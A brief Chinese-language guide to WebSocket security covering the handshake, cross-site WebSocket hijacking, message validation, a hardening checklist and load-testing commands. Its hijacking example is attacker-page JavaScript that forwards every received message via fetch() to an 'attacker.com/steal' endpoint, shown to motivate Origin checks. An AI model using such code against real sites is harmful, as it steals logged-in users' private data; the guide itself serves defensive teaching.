# WebSocket 安全

## 协议基础

WebSocket 在 HTTP 握手后升级为全双工通信通道。

### 握手请求
```
GET /ws HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

## 常见漏洞

### CSWSH（跨站点 WebSocket 劫持）
WebSocket 握手不验证 Origin → 恶意页面可连接到用户已登录的应用。

```javascript
// 攻击者页面
const ws = new WebSocket('wss://victim.com/ws');
ws.onmessage = (e) => {
    // 接收用户的私密数据
    fetch('https://attacker.com/steal', {method:'POST', body:e.data});
};
```

**防护**：验证 Origin Header + 一次性 Token

```javascript
// 服务端验证
const allowedOrigins = ['https://example.com'];
function verifyWsOrigin(origin) {
    if (!allowedOrigins.includes(origin)) {
        ws.close(1008, 'Origin not allowed');
    }
}

// 在 URL 中嵌入 Token
const ws = new WebSocket(`wss://api.example.com/ws?token=${sessionToken}`);
```

### 消息注入
```json
// ❌ 不验证消息内容
// ✅ 使用白名单格式
{
    "type": "heartbeat|message|typing",
    "payload": {...}
}
```

## 安全配置清单

- [ ] 使用 WSS（WebSocket Secure）
- [ ] 验证 Origin Header
- [ ] 使用一次性 Token 验证身份
- [ ] 限制消息大小（默认建议 1MB）
- [ ] 实现心跳超时断开
- [ ] 消息内容白名单验证
- [ ] 限制单连接消息频率
- [ ] 不在 WebSocket 中传输敏感数据

## 负载测试
```bash
# 使用 wscat 测试
wscat -c wss://api.example.com/ws
# 使用 artillery 做 WebSocket 压测
artillery run ws-benchmark.yml
```
